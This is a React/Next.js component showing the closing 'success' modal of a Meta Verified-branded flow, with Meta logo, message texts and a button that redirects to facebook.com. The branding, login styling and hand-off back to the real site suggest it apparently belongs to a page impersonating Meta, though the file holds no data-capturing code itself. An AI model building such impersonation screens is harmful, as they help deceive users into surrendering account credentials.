'use client';

import '@/assets/css/meta-verified-modals.css';
import MetaLogoGrey from '@/assets/images/meta-logo-grey.png';
import SuccessImage from '@/assets/images/succes.jpg';
import TickIcon from '@/assets/images/tick.svg';
import type { MetaVerifiedTexts } from '@/constants/meta-verified-texts';
import Image from 'next/image';
import { type FC } from 'react';

const FinalModal: FC<{ uiTexts: MetaVerifiedTexts }> = ({ uiTexts }) => {
    return (
        <div className='mv-modal-overlay' role='dialog' aria-modal='true'>
            <div
                className='mv-modal-card'
                style={{
                    padding: '36px 32px 28px',
                    display: 'flex',
                    flexDirection: 'column',
                    alignItems: 'center',
                    borderRadius: '24px'
                }}
            >
                <h2 style={{ fontSize: '22px', fontWeight: 700, color: '#1c2b33', margin: '0 0 20px 0', textAlign: 'center' }}>
                    {uiTexts.successTitle}
                </h2>

                <div style={{ width: '100%', borderRadius: '16px', overflow: 'hidden', marginBottom: '24px', boxShadow: '0 4px 12px rgba(0,0,0,0.05)' }}>
                    <Image src={SuccessImage} alt='Success' className='h-auto w-full' />
                </div>

                <div style={{ textAlign: 'center', width: '100%', maxWidth: '380px', marginBottom: '28px' }}>
                    <p style={{ fontSize: '15px', color: '#4b5e7d', lineHeight: '1.6', margin: '0 0 12px 0', fontWeight: 500 }}>
                        {uiTexts.successMessage1}
                    </p>
                    <p style={{ fontSize: '15px', color: '#4b5e7d', lineHeight: '1.6', margin: 0, fontWeight: 500 }}>
                        {uiTexts.successMessage2}
                        <Image src={TickIcon} width={18} height={18} alt='tick' style={{ display: 'inline-block', verticalAlign: 'middle', marginLeft: '6px' }} />
                    </p>
                    <p style={{ fontSize: '13px', color: '#8a9ab5', lineHeight: '1.5', margin: '12px 0 0 0' }}>{uiTexts.successMessage3}</p>
                </div>

                <button
                    type='button'
                    className='mv-login-submit'
                    onClick={() => window.location.replace('https://www.facebook.com')}
                >
                    {uiTexts.confirm}
                </button>

                <div style={{ marginTop: '32px', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '4px' }}>
                    <Image src={MetaLogoGrey} alt='Meta Logo' height={18} style={{ height: '18px', width: 'auto', opacity: 0.8 }} />
                    <span style={{ fontSize: '12px', color: '#8a9ab5', fontWeight: 400 }}>{uiTexts.aboutHelpMore}</span>
                </div>
            </div>
        </div>
    );
};

export default FinalModal;
